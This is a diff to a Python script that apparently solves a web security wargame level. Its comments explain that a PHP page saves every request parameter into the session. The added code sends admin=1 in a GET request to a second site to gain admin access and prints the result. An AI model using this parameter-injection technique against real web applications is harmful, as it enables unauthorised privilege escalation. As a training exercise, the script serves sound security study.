@@ -50,3 +50,18 @@ if(array_key_exists("submit", $_REQUEST)) {
 # which will store any parameters that we submit to the webpage, including the admin parameter
 # this is the main vulnerability.
 # therefore, we can ignore the rest of the code that performs the validation
+
+
+# part 1 of the attack
+# we need to submit the admin parameter to the second website
+# we can submit the admin parameter using either the post or get request
+# the only key that the above lines of code searching for is the 'submit' key
+# therefore, as long as we have the submit key, it doesn't matter what request method we use
+params = {
+    'admin' : '1',
+    'debug' : '1',
+    'submit' : '1'
+}
+response = session.get(SECOND_URL, params=params)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
